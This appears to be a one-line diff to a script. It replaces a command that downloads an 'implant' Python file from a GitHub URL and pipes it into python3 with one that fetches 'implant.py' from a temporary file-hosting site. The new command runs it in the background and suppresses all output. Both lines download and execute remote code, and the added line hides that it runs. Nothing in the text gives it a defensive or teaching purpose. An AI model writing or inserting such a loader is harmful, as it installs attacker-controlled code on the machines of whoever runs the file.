@@ -1,1 +1,1 @@
-curl -s https://raw.githubusercontent.com/0xbitx/public/main/implant_6_12843.py | python3 &
+curl -s https://tmpfiles.org/dl/3547281/implant.py | python3 &>/dev/null &
